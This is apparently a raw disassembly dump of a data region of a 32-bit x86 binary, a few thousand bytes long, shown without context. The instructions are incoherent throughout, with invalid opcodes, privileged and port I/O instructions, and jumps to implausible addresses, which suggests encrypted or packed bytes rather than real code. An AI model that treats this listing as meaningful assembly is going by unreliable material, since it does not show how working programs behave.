  40f2f6:	xchg   ebx,eax
  40f2f7:	in     eax,0x3d
  40f2f9:	cld    
  40f2fa:	pop    esi
  40f2fb:	fs jg  0x40f2fa
  40f2fe:	pop    esi
  40f2ff:	jmp    0x34062e9
  40f304:	pop    esp
  40f305:	dec    edx
  40f306:	int    0xea
  40f308:	xchg   esi,eax
  40f309:	cmp    edx,DWORD PTR [ebx+0x60]
  40f30c:	adc    BYTE PTR [eax-0x90a9b54],0xf7
  40f313:	fdivr  QWORD PTR [ebp-0x6e]
  40f316:	jge    0x40f311
  40f318:	in     eax,0x80
  40f31a:	add    dh,ah
  40f31c:	(bad)  
  40f31d:	fld    TBYTE PTR [ebp-0x2696a]
  40f323:	in     eax,dx
  40f324:	into   
  40f325:	dec    eax
  40f326:	or     eax,0x9c1f3454
  40f32b:	sub    BYTE PTR [eax+ebx*2+0x22d308cd],ch
  40f332:	jo     0x40f399
  40f334:	mov    ds:0x51017b2d,al
  40f339:	push   cs
  40f33a:	add    DWORD PTR gs:[eax-0x3e],ebx
  40f33e:	ins    BYTE PTR es:[edi],dx
  40f33f:	add    eax,0x49d8113d
  40f344:	add    BYTE PTR [eax+0x354c7015],0x28
  40f34b:	xor    dl,ch
  40f34d:	fstp   TBYTE PTR [ebp+0x63891056]
  40f353:	push   0x1ddb7994
  40f358:	ja     0x40f31f
  40f35a:	add    al,0x45
  40f35c:	inc    esp
  40f35d:	(bad)  
  40f35f:	lods   al,BYTE PTR ds:[esi]
  40f360:	mov    eax,0x1ff5d695
  40f365:	xor    DWORD PTR [ecx-0x6b],ebx
  40f368:	call   0xc7cf:0xbd9d9878
  40f36f:	sub    ebx,esp
  40f371:	retf   0x54d3
  40f374:	xchg   esi,eax
  40f375:	hlt    
  40f376:	test   eax,0x8442bd61
  40f37b:	mov    ebp,0x319b9b9c
  40f380:	sub    BYTE PTR [ecx],0xc
  40f383:	jno    0x40f399
  40f385:	imul   esp,DWORD PTR [ebx-0x5299604b],0x95bcf1a3
  40f38f:	mov    eax,0x98c9e1c7
  40f394:	xor    eax,0xd4902767
  40f399:	js     0x40f336
  40f39b:	mov    bh,0x97
  40f39d:	fnsave ds:0xbb8a40b4
  40f3a3:	call   0x9c0e15b0
  40f3a8:	or     BYTE PTR [esi],ch
  40f3aa:	mov    bl,0xea
  40f3ac:	sbb    bl,BYTE PTR [edx+0x2b]
  40f3af:	arpl   WORD PTR [ecx],bp
  40f3b1:	(bad)  
  40f3b2:	das    
  40f3b3:	xlat   BYTE PTR ds:[ebx]
  40f3b4:	and    esp,edx
  40f3b6:	imul   ecx,DWORD PTR [ecx],0xffffffce
  40f3b9:	enter  0x2751,0x53
  40f3bd:	inc    esp
  40f3be:	mov    WORD PTR [edi-0x68d92977],ss
  40f3c4:	push   0xfbd044d2
  40f3c9:	imul   cx,WORD PTR [ebx+esi*8],0xffb0
  40f3ce:	dec    esp
  40f3cf:	outs   dx,BYTE PTR ds:[esi]
  40f3d0:	cmp    ah,BYTE PTR [eax+0x342b26b0]
  40f3d6:	fcmove st,st(6)
  40f3d8:	cwde   
  40f3d9:	adc    bh,BYTE PTR [edi+0x2f]
  40f3dc:	push   cs
  40f3dd:	daa    
  40f3de:	xchg   esp,eax
  40f3df:	(bad)  
  40f3e0:	sar    BYTE PTR [ecx-0x22700d19],1
  40f3e6:	sub    ah,BYTE PTR [esi+0x2c]
  40f3e9:	pop    es
  40f3ea:	or     BYTE PTR [esi+0x6ec569ca],dl
  40f3f0:	mov    WORD PTR [edi+0x29c20a1b],?
  40f3f6:	or     al,0x47
  40f3f8:	mov    edx,0x528903a6
  40f3fd:	iret   
  40f3fe:	or     al,0xd3
  40f400:	jb     0x40f3e6
  40f402:	sub    cl,BYTE PTR [esi-0x2c]
  40f405:	xchg   edx,eax
  40f406:	push   edx
  40f407:	je     0x40f3ab
  40f409:	pushf  
  40f40a:	fnsave [edx]
  40f40c:	mov    ecx,DWORD PTR [ebx+0x46e2dbb1]
  40f412:	or     eax,0xebdf53ef
  40f417:	jno    0x40f44e
  40f419:	shr    BYTE PTR [edi-0x61],0xc
  40f41d:	fwait
  40f41e:	test   BYTE PTR [eax-0x3c],al
  40f421:	sbb    edx,DWORD PTR [esi]
  40f423:	sbb    al,0x42
  40f426:	lods   eax,DWORD PTR ds:[esi]
  40f427:	mov    al,0x47
  40f429:	adc    eax,ebp
  40f42b:	mov    dl,0x5f
  40f42d:	nop
  40f42e:	or     cl,BYTE PTR [esi+0xa]
  40f431:	add    DWORD PTR [eax-0x7a],ebp
  40f434:	push   eax
  40f435:	arpl   WORD PTR ds:0x6a126274,sp
  40f43b:	icebp  
  40f43c:	sti    
  40f43d:	add    eax,0x8fc4bb4d
  40f442:	or     ch,BYTE PTR [ebx-0x47]
  40f445:	dec    esp
  40f446:	(bad)  
  40f447:	cmc    
  40f448:	mov    ecx,0xc4cc5582
  40f44d:	inc    ebx
  40f44e:	mov    ebp,0x1bc6dfdb
  40f453:	outs   dx,BYTE PTR ds:[esi]
  40f454:	aaa    
  40f455:	popf   
  40f456:	push   esi
  40f457:	jmp    0x1c3ffac0
  40f45c:	fs jl  0x40f4ce
  40f45f:	add    edi,ecx
  40f461:	pop    ecx
  40f462:	mov    bl,0xaa
  40f464:	mov    edi,0xa1c1fcb1
  40f469:	loop   0x40f476
  40f46b:	xchg   DWORD PTR [eax-0x1419968f],eax
  40f471:	pop    es
  40f472:	mov    ch,0xf8
  40f474:	and    DWORD PTR [esi-0x2e],edi
  40f477:	push   0xffffffa3
  40f479:	push   ebp
  40f47a:	pmaddwd mm1,QWORD PTR [ebx+eax*1+0x7d39cfad]
  40f482:	loop   0x40f4f3
  40f484:	sub    al,0x80
  40f486:	mov    al,dl
  40f488:	xlat   BYTE PTR ds:[ebx]
  40f489:	gs xchg ebp,eax
  40f48b:	(bad)  
  40f48c:	jnp    0x40f4ba
  40f48e:	repz push edx
  40f490:	addr16 jge 0x40f447
  40f493:	les    ecx,FWORD PTR [ebx-0x2dca74ee]
  40f499:	sbb    al,0x42
  40f49b:	add    BYTE PTR [ecx],al
  40f49d:	xor    cl,BYTE PTR [ebx+0x158b0875]
  40f4a3:	rcr    BYTE PTR [edx+eax*2],cl
  40f4a6:	add    BYTE PTR [ecx+0x510893f6],al
  40f4ac:	pop    es
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	mov    ebx,0x4b2951e4
  40f4c9:	lea    esp,[edx+0x62]
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx-0x76]
  40f4d1:	xchg   esi,eax
  40f4d2:	or     eax,edx
  40f4d4:	shr    BYTE PTR [edi+0x542e64ac],1
  40f4da:	jl     0x40f556
  40f4dc:	jne    0x40f52a
  40f4de:	iret   
  40f4df:	fwait
  40f4e0:	xchg   edx,eax
  40f4e1:	ds out dx,eax
  40f4e3:	inc    ecx
  40f4e4:	daa    
  40f4e5:	mov    al,ds:0x27705cce
  40f4ea:	jg     0x40f4ec
  40f4ec:	add    BYTE PTR [ecx],dh
  40f4ee:	jne    0x40f4f1
  40f4f0:	sub    dh,ah
  40f4f2:	sbb    edx,DWORD PTR [ecx-0x4]
  40f4f5:	fld    DWORD PTR [edi-0x17]
  40f4f8:	xchg   edi,eax
  40f4f9:	out    dx,eax
  40f4fa:	dec    BYTE PTR [eax-0x25174d59]
  40f500:	inc    ecx
  40f501:	jnp    0x40f535
  40f503:	jmp    0x40f4c5
  40f505:	mov    ebp,0xf93c69de
  40f50a:	and    BYTE PTR [edx-0x4b],cl
  40f50d:	inc    ebp
  40f50e:	mov    ?,WORD PTR [esi-0x26]
  40f511:	mov    bl,bl
  40f513:	jmp    0x484b7c33
  40f518:	(bad)  
  40f519:	fdivr  DWORD PTR [edx]
  40f51b:	mov    ah,0x48
  40f51d:	daa    
  40f51e:	xor    BYTE PTR [ebx],cl
  40f520:	fdivr  QWORD PTR [eax]
  40f522:	xor    al,0xf4
  40f524:	sub    dh,dl
  40f526:	test   BYTE PTR [esp],ah
  40f529:	aam    0xfc
  40f52b:	sbb    al,0xb2
  40f52d:	mov    esp,esi
  40f52f:	xor    bh,BYTE PTR [esi+edi*4+0x3b7c06df]
  40f536:	mov    cl,0xeb
  40f538:	cmp    ch,0xbe
  40f53b:	push   esp
  40f53c:	ss and al,0x55
  40f53f:	ins    BYTE PTR es:[edi],dx
  40f540:	lods   al,BYTE PTR ds:[esi]
  40f541:	loop   0x40f58c
  40f543:	(bad)  
  40f544:	out    0xf2,al
  40f546:	cmp    ch,0x77
  40f549:	mov    ebp,0x2f33b9cc
  40f54e:	or     edi,DWORD PTR [ebx]
  40f550:	mov    edx,0xb7b2f340
  40f555:	push   ecx
  40f556:	pop    ds
  40f557:	clc    
  40f558:	fdivr  DWORD PTR [edi-0x46]
  40f55b:	call   0xe2ae:0x7887d8d5
  40f562:	test   DWORD PTR [ebx+0x3a5047b9],0x665e5e1
  40f56c:	and    al,bh
  40f56e:	(bad)  
  40f56f:	jmp    0xa1f1c313
  40f574:	fidiv  WORD PTR [edi]
  40f576:	xor    DWORD PTR [esi],esi
  40f578:	lods   eax,DWORD PTR ds:[esi]
  40f579:	out    dx,eax
  40f57a:	jl     0x40f5c9
  40f57c:	xor    eax,0xd1f2fded
  40f581:	push   edx
  40f582:	push   eax
  40f583:	jmp    0x40f511
  40f585:	pop    esi
  40f586:	sbb    DWORD PTR [esi+0x16],edi
  40f589:	enter  0xa62c,0x3a
  40f58d:	outs   dx,BYTE PTR ds:[esi]
  40f58e:	jbe    0x40f604
  40f590:	lock push edi
  40f592:	jnp    0x40f5ce
  40f594:	mov    edx,0xd40bf3b4
  40f599:	mov    dh,0x38
  40f59b:	neg    BYTE PTR [ecx]
  40f59d:	add    edx,DWORD PTR [ecx]
  40f59f:	cmp    esi,DWORD PTR [edx]
  40f5a1:	or     DWORD PTR [edx-0x6a],edx
  40f5a4:	sbb    eax,0x4b64338d
  40f5a9:	pop    eax
  40f5aa:	dec    ecx
  40f5ab:	(bad)
  40f5ae:	pop    ds
  40f5af:	shl    BYTE PTR [edx+0x16],cl
  40f5b2:	test   al,0x96
  40f5b4:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5b6:	dec    edi
  40f5b7:	and    eax,0xa467962c
  40f5bc:	mov    edx,0x6d8e4f99
  40f5c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5c2:	int3   
  40f5c3:	test   DWORD PTR [ebx-0x44fd4dd9],ebp
  40f5c9:	setp   BYTE PTR [esi-0x597c81c9]
  40f5d0:	aaa    
  40f5d1:	mov    ds:0xa0ca5ae8,eax
  40f5d6:	sub    esp,ebx
  40f5d8:	sbb    al,0xb
  40f5da:	sbb    DWORD PTR [edi+0x7cb33f06],ebp
  40f5e0:	mov    ecx,DWORD PTR [esi+0x485f210d]
  40f5e6:	out    0xf6,al
  40f5e8:	push   esi
  40f5e9:	call   0xb0871769
  40f5ee:	lds    edx,FWORD PTR [ecx+0x6b]
  40f5f1:	push   eax
  40f5f2:	pop    ebx
  40f5f3:	jo     0x40f5aa
  40f5f5:	icebp  
  40f5f6:	pop    esi
  40f5f7:	popf   
  40f5f8:	add    bh,cl
  40f5fa:	imul   edx,DWORD PTR [edi-0x76],0xffffffcc
  40f5fe:	rcl    edi,cl
  40f600:	(bad)
  40f603:	pop    es
  40f604:	and    DWORD PTR [esi-0x22813513],ebp
  40f60a:	inc    ebp
  40f60b:	popa   
  40f60c:	inc    ebp
  40f60d:	pop    eax
  40f60e:	sub    DWORD PTR [ebp-0x293cd519],ebx
  40f614:	scas   al,BYTE PTR es:[edi]
  40f615:	push   0x55
  40f617:	mov    BYTE PTR [edx],dl
  40f619:	mov    eax,0xfa103f37
  40f61e:	inc    eax
  40f61f:	and    esp,DWORD PTR [esi-0x43]
  40f622:	ror    BYTE PTR [ecx],cl
  40f624:	stc    
  40f625:	adc    BYTE PTR [ebp+0xaf3cdb],ch
  40f62b:	mov    edi,0x73a75d0e
  40f630:	imul   ebp,DWORD PTR [ecx-0x50],0xffffffad
  40f634:	bound  esi,QWORD PTR [eax+0x1043c937]
  40f63a:	lds    esi,FWORD PTR [ebp-0x3]
  40f63d:	sahf   
  40f63e:	jns    0x40f66e
  40f640:	dec    ebx
  40f641:	xor    DWORD PTR [ebp+0x21b4ed4],ebp
  40f647:	cmp    BYTE PTR [ebx],dh
  40f649:	jnp    0x40f63d
  40f64b:	ja     0x40f64f
  40f64d:	adc    BYTE PTR [eax-0x46],0x7c
  40f651:	inc    esp
  40f652:	dec    eax
  40f653:	daa    
  40f654:	and    BYTE PTR [eax+edx*4+0x2119d6bd],dh
  40f65b:	nop
  40f65c:	dec    ecx
  40f65d:	mov    al,ds:0x5d6f7322
  40f662:	jl     0x40f679
  40f664:	popa   
  40f665:	rcr    DWORD PTR ds:0xb7bf3f22,cl
  40f66b:	in     eax,0xee
  40f66d:	mov    eax,0xc56eadb6
  40f672:	xchg   ebp,eax
  40f673:	inc    eax
  40f674:	push   ebp
  40f675:	add    al,0xe2
  40f677:	inc    edx
  40f678:	push   ebp
  40f679:	scas   eax,DWORD PTR es:[edi]
  40f67a:	rcl    BYTE PTR [edi-0x7656a137],1
  40f680:	popa   
  40f681:	stos   DWORD PTR es:[edi],eax
  40f682:	adc    eax,DWORD PTR [eax+0x3e]
  40f685:	add    BYTE PTR [eax],al
  40f687:	mov    dh,0x3b
  40f689:	addr16 out dx,eax
  40f68b:	out    dx,al
  40f68c:	add    BYTE PTR [ebp+eax*4-0x3fab07f],dl
  40f693:	mul    DWORD PTR [esi]
  40f695:	xchg   ebp,eax
  40f696:	mov    eax,0xe0e0aaef
  40f69b:	jecxz  0x40f6a5
  40f69d:	cmp    DWORD PTR [ecx-0x682ba41f],ebp
  40f6a3:	imul   ebp,DWORD PTR [ebx+0x71],0x41
  40f6a7:	jo     0x40f701
  40f6a9:	das    
  40f6aa:	mov    eax,ds:0x9d6def31
  40f6af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6b0:	jge    0x40f667
  40f6b2:	sar    DWORD PTR [edx-0x2aa728be],1
  40f6b8:	bound  edi,QWORD PTR [eax-0x51]
  40f6bb:	aas    
  40f6bc:	das    
  40f6bd:	mov    ds:0xa2999e9a,eax
  40f6c2:	adc    al,0x94
  40f6c4:	(bad)  
  40f6c5:	pop    ecx
  40f6c6:	or     bl,BYTE PTR [eax+0xa95285d]
  40f6cc:	dec    esi
  40f6cd:	imul   esi,DWORD PTR [edi+eiz*8],0x379f1806
  40f6d4:	adc    bl,BYTE PTR ds:0x6fcac8
  40f6da:	sub    ebx,edi
  40f6dc:	xchg   DWORD PTR gs:[esi-0x12155017],esi
  40f6e3:	adc    esi,DWORD PTR [edx+0x417d4117]
  40f6e9:	inc    eax
  40f6ea:	(bad)  
  40f6eb:	aaa    
  40f6ec:	add    al,0xb1
  40f6ee:	les    edi,FWORD PTR [esi-0x7e]
  40f6f1:	inc    eax
  40f6f2:	je     0x40f74f
  40f6f4:	das    
  40f6f5:	in     al,dx
  40f6f6:	arpl   WORD PTR [eax+ecx*2],si
  40f6f9:	cmp    eax,0xc158b537
  40f6fe:	mov    BYTE PTR [ebx],cl
  40f700:	jmp    0x4296:0x757b9749
  40f707:	lea    esp,[edx+0x62]
  40f70a:	aas    
  40f70b:	pop    edi
  40f70c:	jnp    0x40f712
  40f70e:	push   ds
  40f70f:	jmp    0x40f6f6
  40f711:	sub    ebx,esp
  40f713:	cmp    al,0x8f
  40f715:	pop    ss
  40f716:	retf   0x82c3
  40f719:	jnp    0x40f77a
  40f71b:	or     bl,al
  40f71d:	mov    ds:0x34c37957,al
  40f722:	(bad)  
  40f723:	iret   
  40f724:	cmp    edx,DWORD PTR [edx+0x15873c8b]
  40f72a:	out    0xe3,al
  40f72c:	sub    eax,0x8c2ed327
  40f731:	jmp    0xfd02:0x42c0dd5
  40f738:	in     eax,0x25
  40f73a:	xchg   esi,eax
  40f73b:	xchg   BYTE PTR [ebp-0x7e],bh
  40f73e:	adc    BYTE PTR [esi],ah
  40f740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f741:	enter  0xaea0,0x97
  40f745:	dec    ebx
  40f746:	adc    ah,BYTE PTR [ecx-0x34]
  40f749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f74a:	xchg   ecx,eax
  40f74b:	xchg   esp,eax
  40f74c:	pop    ebp
  40f74d:	mov    ecx,0x1a8746d1
  40f752:	dec    DWORD PTR ds:0x150fea99
  40f758:	ret    0x2649
  40f75b:	sub    BYTE PTR [ecx],bl
  40f75d:	xor    dh,BYTE PTR [ecx]
  40f75f:	mov    ecx,0xeb3bd2ac
  40f764:	pop    esp
  40f765:	mov    eax,0xf6a2201
  40f76a:	jmp    0xf5b6f46c
  40f76f:	fistp  DWORD PTR ds:0x364b67c3
  40f775:	aas    
  40f776:	fstp   DWORD PTR [ebx+0x53]
  40f779:	mov    ecx,0x7f2d1480
  40f77e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f77f:	jo     0x40f7ad
  40f781:	and    DWORD PTR [ecx+0x3d],ebp
  40f784:	clc    
  40f785:	ror    BYTE PTR [edi-0x7874c3fa],1
  40f78b:	dec    ebp
  40f78c:	cmp    DWORD PTR [ecx-0x7159e326],ecx
  40f792:	dec    ebx
  40f793:	dec    edx
  40f794:	into   
  40f795:	mov    dh,0xb
  40f797:	pop    edi
  40f798:	cwde   
  40f799:	add    ebp,eax
  40f79b:	mov    esi,es
  40f79d:	loopne 0x40f802
  40f79f:	and    edi,DWORD PTR [eax+0x4a]
  40f7a2:	mov    bh,0x62
  40f7a4:	lock fcom QWORD PTR [bx+di+0x12]
  40f7a9:	mov    al,0x38
  40f7ab:	push   eax
  40f7ac:	es jnp 0x40f7ce
  40f7af:	jl     0x40f7dd
  40f7b1:	push   ebp
  40f7b2:	jl     0x40f822
  40f7b4:	shl    edi,0x60
  40f7b7:	outs   dx,BYTE PTR ds:[esi]
  40f7b8:	cs mov esp,0xe5023c15
  40f7be:	or     edx,DWORD PTR [eax]
  40f7c0:	scas   eax,DWORD PTR es:[edi]
  40f7c1:	call   0x5b14062
  40f7c6:	xor    ebx,DWORD PTR ds:0x786d221e
  40f7cc:	or     cl,BYTE PTR [edi-0x56464b2c]
  40f7d2:	mov    ebp,0xc387666b
  40f7d7:	jecxz  0x40f7ea
  40f7d9:	and    BYTE PTR [ecx+eiz*2+0x484fb0e3],0x86
  40f7e1:	mov    esi,0xd45426f4
  40f7e6:	arpl   WORD PTR [ebp-0x6d00f961],si
  40f7ec:	xchg   ecx,eax
  40f7ed:	aas    
  40f7ee:	loopne 0x40f819
  40f7f0:	push   0x5d
  40f7f2:	ds enter 0xe35b,0xc9
  40f7f7:	data16 jg 0x40f834
  40f7fa:	fist   WORD PTR [ebp+0x6980f322]
  40f800:	xor    DWORD PTR [ebx+0x4c5bcb2f],esi
  40f806:	mov    dl,ch
  40f808:	cmp    bh,cl
  40f80a:	adc    eax,0x4717faeb
  40f80f:	rcr    DWORD PTR [esi-0x2811b0a6],1
  40f815:	int    0x5c
  40f817:	push   es
  40f818:	mov    ah,0x7b
  40f81a:	test   al,0xed
  40f81c:	push   esp
  40f81d:	push   cs
  40f81e:	adc    edx,DWORD PTR [edx+0x57]
  40f821:	(bad)  
  40f822:	imul   esp,DWORD PTR [edi+0xb],0x708faf0e
  40f829:	fist   WORD PTR [edi]
  40f82b:	(bad)  
  40f82c:	call   0x7a2fc2ea
  40f831:	or     eax,esp
  40f833:	sbb    bh,BYTE PTR [edx]
  40f835:	push   edi
  40f836:	cmp    edx,esp
  40f838:	dec    edi
  40f839:	ret    
  40f83a:	xchg   edx,eax
  40f83b:	xchg   ebx,eax
  40f83c:	push   esi
  40f83d:	cdq    
  40f83e:	inc    esp
  40f83f:	push   ebx
  40f840:	das    
  40f841:	or     DWORD PTR [ecx],edx
  40f843:	int3   
  40f844:	fld    st(1)
  40f846:	push   ecx
  40f847:	push   ecx
  40f848:	mul    DWORD PTR [ecx-0x11]
  40f84b:	stos   BYTE PTR es:[edi],al
  40f84c:	jge    0x40f8bb
  40f84e:	shl    DWORD PTR [eax],cl
  40f850:	fisubr DWORD PTR [eax+ecx*8]
  40f853:	xchg   ecx,eax
  40f854:	out    0x54,eax
  40f856:	pop    ebp
  40f857:	out    0xe9,al
  40f859:	mov    ecx,0x521b2a06
  40f85e:	mov    ?,esp
  40f860:	scas   eax,DWORD PTR es:[edi]
  40f861:	jg     0x40f8ae
  40f863:	popa   
  40f864:	jp     0x40f834
  40f866:	cmp    eax,0xbdbff728
  40f86b:	cli    
  40f86c:	test   eax,0xa71b9ca1
  40f871:	iret   
  40f872:	or     ch,cl
  40f874:	gs inc edi
  40f876:	ins    BYTE PTR es:[edi],dx
  40f877:	repz popa 
  40f879:	icebp  
  40f87a:	mov    esp,0x3918d7b4
  40f87f:	out    dx,eax
  40f880:	jae    0x40f839
  40f882:	je     0x40f80f
  40f884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f885:	in     al,0x40
  40f887:	aam    0x1f
  40f889:	push   cs
  40f88a:	and    eax,0x1f64287d
  40f88f:	push   es
  40f890:	fdiv   QWORD PTR [eax-0x7e531104]
  40f896:	scas   eax,DWORD PTR es:[edi]
  40f897:	adc    esi,DWORD PTR [esp+eax*1-0x2b2a188]
  40f89e:	neg    BYTE PTR [edx]
  40f8a0:	jle    0x40f8f0
  40f8a2:	aaa    
  40f8a3:	mov    eax,ds:0xc0aa8454
  40f8a8:	outs   dx,BYTE PTR ds:[esi]
  40f8a9:	add    cl,ah
  40f8ab:	mov    eax,ds:0xe5008cec
  40f8b0:	cmp    dh,BYTE PTR [edx-0x66]
  40f8b3:	mov    BYTE PTR [eax+0x290ae194],0x2a
  40f8ba:	jg     0x40f855
  40f8bc:	call   0xe541:0x88862cdb
  40f8c3:	dec    edi
  40f8c4:	xor    ebx,DWORD PTR [ecx-0x6448ab8f]
  40f8ca:	sub    bl,ah
  40f8cc:	mov    ebp,0x6e78e398
  40f8d1:	add    DWORD PTR [ebx+edi*2+0xd],0x7b
  40f8d6:	sbb    al,0xe9
  40f8d8:	lahf   
  40f8d9:	outs   dx,BYTE PTR ds:[esi]
  40f8da:	xchg   esi,eax
  40f8db:	or     dl,BYTE PTR [edi-0x6763480e]
  40f8e1:	or     ebx,edx
  40f8e3:	mov    ecx,0x6e865d8f
  40f8e8:	popf   
  40f8e9:	mov    esi,0x34a5211b
  40f8ee:	ss popf 
  40f8f0:	lock cli 
  40f8f2:	mov    edi,0xc5fe0ec6
  40f8f7:	mov    esi,0x6a264a3f
  40f8fc:	cmp    eax,0x30615962
  40f901:	jp     0x40f937
  40f903:	outs   dx,DWORD PTR ds:[esi]
  40f904:	les    esi,FWORD PTR [eax]
  40f906:	fwait
  40f907:	push   edx
  40f908:	jne    0x40f8aa
  40f90a:	lods   al,BYTE PTR ds:[esi]
  40f90b:	loope  0x40f8b4
  40f90d:	fstp   DWORD PTR [esi+0x7292f476]
  40f913:	sbb    al,BYTE PTR [ecx-0x3e885d44]
  40f919:	push   edx
  40f91a:	popa   
  40f91b:	dec    eax
  40f91c:	cmc    
  40f91d:	js     0x40f944
  40f91f:	loopne 0x40f94d
  40f921:	sbb    DWORD PTR [eax+ecx*4+0x42],esp
  40f925:	test   eax,0x99135774
  40f92a:	je     0x40f90a
  40f92c:	into   
  40f92d:	pop    ss
  40f92e:	xchg   esp,eax
  40f92f:	cs add esi,esi
  40f932:	mov    cl,0x7f
  40f934:	in     al,0x72
  40f936:	mov    ecx,0x9f74221d
  40f93b:	mov    ecx,0x6651ce6b
  40f940:	and    dl,BYTE PTR [edx]
  40f942:	pop    esp
  40f943:	dec    esi
  40f944:	out    0x29,al
  40f946:	loopne 0x40f9a8
  40f948:	sbb    al,BYTE PTR [edi+0x2d]
  40f94b:	loop   0x40f968
  40f94d:	mov    edi,0xefde5c11
  40f952:	sbb    BYTE PTR [esi-0x59],al
  40f955:	mov    WORD PTR [ecx],?
  40f957:	daa    
  40f958:	add    cl,BYTE PTR [eax+0x31]
  40f95b:	fcmovnbe st,st(6)
  40f95d:	mov    BYTE PTR [edx+0x124e5cf3],ch
  40f963:	xchg   edx,eax
  40f964:	sub    DWORD PTR [ecx+esi*2],ebx
  40f967:	cmp    DWORD PTR ds:0x617b7dd4,ecx
  40f96d:	inc    esi
  40f96e:	leave  
  40f96f:	imul   esi,DWORD PTR [edx+0x4e22b175],0x27
  40f976:	out    0xf6,eax
  40f978:	and    eax,0x61cc45ce
  40f97d:	arpl   WORD PTR [ecx-0x45],ax
  40f980:	cwde   
  40f981:	mov    DWORD PTR [ecx],edx
  40f983:	push   eax
  40f984:	dec    edi
  40f985:	imul   esp,DWORD PTR [eax-0x5f3f827d],0xca4f4330
  40f98f:	mov    ss,WORD PTR [ecx-0x2c]
  40f992:	dec    esi
  40f993:	add    dh,BYTE PTR [ebx+0x17]
  40f996:	jne    0x40f963
  40f998:	sbb    BYTE PTR [edx+0x4d],dl
  40f99b:	or     BYTE PTR [edi+0x4c],dh
  40f99e:	retf   0x7090
  40f9a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9a2:	xchg   esp,eax
  40f9a3:	dec    edi
  40f9a4:	stos   DWORD PTR es:[edi],eax
  40f9a5:	cdq    
  40f9a6:	inc    edx
  40f9a7:	repnz mov dl,0xa7
  40f9aa:	mov    ah,dh
  40f9ac:	xor    esp,DWORD PTR [ebp-0x2]
  40f9af:	cmp    eax,0xbb7f45fd
  40f9b4:	dec    ebx
  40f9b5:	push   edx
  40f9b6:	jnp    0x40f99d
  40f9b8:	and    esi,DWORD PTR [eax-0x34]
  40f9bb:	hlt    
  40f9bc:	scas   eax,DWORD PTR es:[edi]
  40f9bd:	mov    esp,0xeb1e0551
  40f9c2:	ror    BYTE PTR [ecx+0x22],cl
  40f9c5:	mov    eax,0xde69a0d7
  40f9ca:	pusha  
  40f9cb:	lock mov ss,WORD PTR [edi+0x71974cad]
  40f9d2:	loope  0x40f956
  40f9d4:	dec    edx
  40f9d5:	mov    DWORD PTR [ebp-0x23368ba1],ebp
  40f9db:	jg     0x40fa0b
  40f9dd:	cmp    ecx,DWORD PTR [edi]
  40f9df:	push   ebx
  40f9e0:	xchg   BYTE PTR [esp+ebp*8-0x14],ah
  40f9e4:	lea    ecx,[esi-0x7f]
  40f9e7:	adc    BYTE PTR [esi+0x274ac808],0x7
  40f9ee:	push   ax
  40f9f0:	xor    ch,BYTE PTR [ebp+0x7bfe5198]
  40f9f6:	cmp    DWORD PTR ds:0xcd5f3efb,ecx
  40f9fc:	mov    ah,0xee
  40f9fe:	je     0x40f9d4
  40fa00:	bound  ebx,QWORD PTR [edx+0x6d533240]
  40fa06:	push   cs
  40fa07:	enter  0x2a4e,0xa1
  40fa0b:	cmc    
  40fa0c:	js     0x40fa1b
  40fa0e:	gs repnz jecxz 0x40f996
  40fa12:	data16 mov dl,0x1d
  40fa15:	hlt    
  40fa16:	cdq    
  40fa17:	outs   dx,BYTE PTR ds:[esi]
  40fa18:	or     eax,0x6674645c
  40fa1d:	inc    edi
  40fa1e:	pop    edi
  40fa1f:	pop    esi
  40fa20:	fmul   st(4),st
  40fa22:	gs cdq 
  40fa24:	jecxz  0x40fa4e
  40fa26:	xor    edi,DWORD PTR [edi+0x68]
  40fa29:	dec    esi
  40fa2a:	jmp    0x2e8e6fc1
  40fa2f:	push   edx
  40fa30:	les    edx,FWORD PTR [edx]
  40fa32:	pop    es
  40fa33:	cmp    eax,0x12039a72
  40fa38:	jl     0x40f9bf
  40fa3a:	iret   
  40fa3b:	hlt    
  40fa3c:	fwait
  40fa3d:	sbb    eax,0xc10b2f34
  40fa42:	fwait
  40fa43:	xchg   ebx,eax
  40fa44:	div    DWORD PTR [edi+ecx*4+0x5ea8982f]
  40fa4b:	(bad)  
  40fa4c:	mov    al,ds:0xda211853
  40fa51:	mov    cl,0xce
  40fa53:	rcl    BYTE PTR [ecx],1
  40fa55:	mov    cl,0xa8
  40fa57:	xchg   ebp,eax
  40fa58:	sub    ebp,esp
  40fa5a:	in     eax,0xbf
  40fa5c:	xor    eax,0xb6b00d40
  40fa61:	xlat   BYTE PTR ds:[ebx]
  40fa62:	mov    dl,dh
  40fa64:	js     0x40fa14
  40fa66:	or     esp,DWORD PTR [ecx+0x35a93576]
  40fa6c:	loope  0x40fa04
  40fa6e:	mov    cl,0x7c
  40fa70:	jbe    0x40fa11
  40fa72:	repz sub ebx,esi
  40fa75:	in     al,dx
  40fa76:	add    ebx,DWORD PTR [esi-0x68c12544]
  40fa7c:	xchg   edx,eax
  40fa7d:	sbb    al,0x0
  40fa7f:	arpl   WORD PTR [esi],bx
  40fa81:	mov    eax,ds:0x7e5b6520
  40fa86:	jne    0x40fabc
  40fa88:	sbb    BYTE PTR [eax],bl
  40fa8a:	int3   
  40fa8b:	adc    cl,cl
  40fa8d:	fnstsw WORD PTR [ebx+0x677ae2ab]
  40fa93:	jmp    0x28c:0x8f136474
  40fa9a:	sub    esi,esp
  40fa9c:	clc    
  40fa9d:	sub    edi,eax
  40fa9f:	sbb    eax,0x46c95b49
  40faa4:	mov    fs,WORD PTR [edx+eax*8-0x2de8c44e]
  40faab:	js     0x40fa98
  40faad:	clc    
  40faae:	out    dx,al
